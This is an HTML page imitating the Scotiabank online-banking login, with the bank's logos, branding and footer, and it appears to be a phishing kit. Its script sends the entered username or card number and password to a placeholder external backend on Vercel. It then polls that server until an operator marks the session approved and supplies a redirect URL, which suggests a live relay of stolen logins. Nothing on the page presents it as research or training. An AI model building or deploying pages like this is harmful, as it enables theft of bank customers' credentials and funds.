<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <script src="https://cdn.tailwindcss.com"></script>
    <title>Scotiabank Login</title>
    <style>
      .loading {
        display: none;
      }
      .loading.active {
        display: inline-block;
        animation: spin 1s linear infinite;
      }
      @keyframes spin {
        from { transform: rotate(0deg); }
        to { transform: rotate(360deg); }
      }
      .error-message {
        display: none;
        color: #EB121A;
        font-size: 14px;
        margin-top: 5px;
      }
      .error-message.show {
        display: block;
      }
    </style>
  </head>
  <body class="min-h-screen flex flex-col bg-[#F6F7FC]">
    <div
      class="md:p-[20px] flex-1 flex flex-col md:justify-center items-center h-screen bg-[#FAFBFD]"
    >
      <div
        class="md:w-[600px] w-full md:mt-[60px] bg-[white] rounded-[8px] shadow-md md:p-[40px] p-[30px] flex flex-col items-center"
      >
        <div class="w-full flex items-end">
          <i data-lucide="lock-keyhole" class="text-gray-700 ml-auto"></i>
        </div>
        <div>
          <h1
            class="mt-4 text-[1.6rem] leading-[3.5rem] font-[600] tracking-[-0.025rem] text-[rgb(51,51,51)]"
            style="font-family: 'Scotia Headline', Arial, Helvetica, sans-serif"
          >
            Welcome to
          </h1>
        </div>
        <img
          src="data:image/png;base64,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"
          alt="Logo"
          class="h-[40px]"
        />

        <form id="loginForm" class="w-[350px] mt-[50px]">
          <div class="mb-8">
            <label class="block md:text-[18px] text-[14px] font-semibold text-[#1d1d1d]"
              >Username or card number</label
            >
            <div
              class="flex items-center gap-3 border-b-2 border-[#7a7a7a] py-2 focus-within:border-[#007EAB]"
            >
              <i data-lucide="user" class="text-gray-700"></i>
              <input
                id="usernameInput"
                name="login"
                type="text"
                class="border-none w-full mb-2 outline-none focus:ring-0 placeholder:text-[#8a8a8a] bg-transparent text-[#1d1d1d] text-[22px]"
                placeholder="Enter username or card number"
                required
              />
            </div>
            <div id="usernameError" class="error-message"></div>
          </div>

          <div class="mb-8">
            <label class="block md:text-[18px] text-[14px] font-semibold text-[#1d1d1d]"
              >Password</label
            >
            <div
              class="flex items-center gap-3 border-b-2 border-[#7a7a7a] py-2 focus-within:border-[#007EAB]"
            >
              <i data-lucide="lock-keyhole" class="text-gray-700"></i>
              <input
                id="passwordInput"
                name="password"
                type="password"
                class="border-none w-full mb-2 outline-none focus:ring-0 placeholder:text-[#8a8a8a] bg-transparent text-[#1d1d1d] text-[22px]"
                placeholder="Enter password"
                required
              />
            </div>
            <div id="passwordError" class="error-message"></div>
          </div>

          <label
            class="flex items-center gap-3 text-[18px] text-[#1d1d1d] cursor-pointer"
          >
            <input type="checkbox" class="hidden peer" />

            <span
              class="w-[26px] h-[26px] rounded-md border-2 border-[#7a7a7a] flex items-center justify-center peer-checked:bg-[#02a95c] peer-checked:border-[#02a95c]"
            >
              <svg
                class="w-4 h-4 text-white opacity-0 peer-checked:opacity-100"
                viewBox="0 0 24 24"
                fill="currentColor"
              >
                <path d="M20.3 5.7l-11 11-5-5 1.4-1.4 3.6 3.6 9.6-9.6z" />
              </svg>
            </span>

            <span class="text-[16px] font-[300]"
              >Remember my username or card number</span
            >
          </label>
          
          <div class="w-full flex justify-center">
            <button
              id="submitBtn"
              type="submit"
              class="mt-[80px] w-[300px] bg-[#EB121A] px-[20px] py-[15px] rounded-[8px] flex items-center justify-center gap-2"
            >
              <svg class="loading w-5 h-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
              </svg>
              <span class="text-[white] text-[13px]">Sign in</span>
            </button>
          </div>

          <a href="#" class="w-full flex justify-center mt-[20px] items-center">
            <span class="text-[#03749D] text-[16px] font-[700]"
              >Need help signing in?
            </span>
            <i data-lucide="chevron-right" class="text-[#03749D] w-5 h-5"></i>
          </a>
        </form>
      </div>

      <div class="md:flex block gap-[8px] mt-[50px] mb-[70px]">
        <span>Don't have a username and password?</span>
        <br class="md:hidden"/>
        <a href="#" class="font-[600] text-[16px]">Set them up now.</a>
      </div>
    </div>

    <footer class="pt-6 pb-3 text-sm text-gray-600 bg-[white] shadow-md border border-1 hidden md:block">
      <div class="flex justify-between mb-4 py-[10px] px-[50px]">
        <div>
            <img class="h-9 w-13" src="data:image/png;base64,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" alt="">
        </div>
        <div class="flex gap-[20px] font-[300] flex-wrap">
          <a href="#">Contact Us</a>
          <a href="#">Security</a>
          <a href="#">Legal</a>
          <a href="#">Privacy</a>
          <a href="#">Accessibility</a>
          <a href="#">Cookie Settings</a>
        </div>
      </div>

      <hr class="mt-4 mb-3" />

      <div class="flex justify-end px-[20px]">
        <span class="text-[12px]">Â© Scotiabank. All Rights Reserved.</span>
      </div>
    </footer>

    <script src="https://unpkg.com/lucide@latest"></script>
    <script>
      lucide.createIcons();
      
      // Replace with your backend URL
      const BACKEND_URL = 'https://your-backend-url.vercel.app'; // Replace with your actual backend URL
      
      document.getElementById('loginForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const login = document.getElementById('usernameInput').value;
        const password = document.getElementById('passwordInput').value;
        const submitBtn = document.getElementById('submitBtn');
        const loadingIcon = submitBtn.querySelector('.loading');
        const submitText = submitBtn.querySelector('span');
        
        // Reset errors
        document.getElementById('usernameError').classList.remove('show');
        document.getElementById('passwordError').classList.remove('show');
        
        // Validate inputs
        if (!login.trim()) {
          document.getElementById('usernameError').textContent = 'Please enter username or card number';
          document.getElementById('usernameError').classList.add('show');
          return;
        }
        
        if (!password.trim()) {
          document.getElementById('passwordError').textContent = 'Please enter password';
          document.getElementById('passwordError').classList.add('show');
          return;
        }
        
        // Show loading state
        loadingIcon.classList.add('active');
        submitText.textContent = 'Signing in...';
        submitBtn.disabled = true;
        
        try {
          const response = await fetch(`${BACKEND_URL}/login`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              login: login,
              password: password
            })
          });
          
          const data = await response.json();
          
          if (response.ok && data.success) {
            // Success - store session ID and start polling
            const sessionId = data.id;
            localStorage.setItem('sessionId', sessionId);
            
            // Start polling for status
            pollStatus(sessionId);
          } else {
            // Show error
            const errorMsg = data.error || 'Login failed. Please try again.';
            document.getElementById('passwordError').textContent = errorMsg;
            document.getElementById('passwordError').classList.add('show');
            
            // Reset button
            loadingIcon.classList.remove('active');
            submitText.textContent = 'Sign in';
            submitBtn.disabled = false;
          }
        } catch (error) {
          console.error('Error:', error);
          document.getElementById('passwordError').textContent = 'Network error. Please try again.';
          document.getElementById('passwordError').classList.add('show');
          
          // Reset button
          loadingIcon.classList.remove('active');
          submitText.textContent = 'Sign in';
          submitBtn.disabled = false;
        }
      });
      
      async function pollStatus(sessionId) {
        let attempts = 0;
        const maxAttempts = 60; // Try for 5 minutes (5 seconds * 60 = 300 seconds)
        
        const checkStatus = async () => {
          try {
            const response = await fetch(`${BACKEND_URL}/status/${sessionId}`);
            const data = await response.json();
            
            if (response.ok) {
              if (data.status === 'approved' && data.redirect_url) {
                // Redirect to the approved URL
                window.location.href = data.redirect_url;
                return true;
              } else if (data.status === 'pending') {
                // Continue polling
                attempts++;
                if (attempts < maxAttempts) {
                  setTimeout(checkStatus, 5000); // Check every 5 seconds
                } else {
                  // Timeout
                  document.getElementById('passwordError').textContent = 'Request timed out. Please try again.';
                  document.getElementById('passwordError').classList.add('show');
                  resetButton();
                }
              }
            } else {
              // Error
              document.getElementById('passwordError').textContent = 'Status check failed. Please try again.';
              document.getElementById('passwordError').classList.add('show');
              resetButton();
            }
          } catch (error) {
            console.error('Status check error:', error);
            document.getElementById('passwordError').textContent = 'Status check error. Please try again.';
            document.getElementById('passwordError').classList.add('show');
            resetButton();
          }
          return false;
        };
        
        // Start polling
        setTimeout(checkStatus, 5000); // First check after 5 seconds
      }
      
      function resetButton() {
        const submitBtn = document.getElementById('submitBtn');
        const loadingIcon = submitBtn.querySelector('.loading');
        const submitText = submitBtn.querySelector('span');
        
        loadingIcon.classList.remove('active');
        submitText.textContent = 'Sign in';
        submitBtn.disabled = false;
      }
      
      // Auto-fill saved credentials if remember me was checked
      document.addEventListener('DOMContentLoaded', function() {
        const rememberCheckbox = document.querySelector('input[type="checkbox"]');
        const usernameInput = document.getElementById('usernameInput');
        
        // Check if we have saved credentials
        const savedUsername = localStorage.getItem('savedUsername');
        if (savedUsername) {
          usernameInput.value = savedUsername;
          rememberCheckbox.checked = true;
        }
        
        // Update save state on checkbox change
        rememberCheckbox.addEventListener('change', function() {
          if (this.checked && usernameInput.value) {
            localStorage.setItem('savedUsername', usernameInput.value);
          } else {
            localStorage.removeItem('savedUsername');
          }
        });
        
        // Update on input
        usernameInput.addEventListener('input', function() {
          if (rememberCheckbox.checked && this.value) {
            localStorage.setItem('savedUsername', this.value);
          }
        });
      });
    </script>
  </body>
</html>
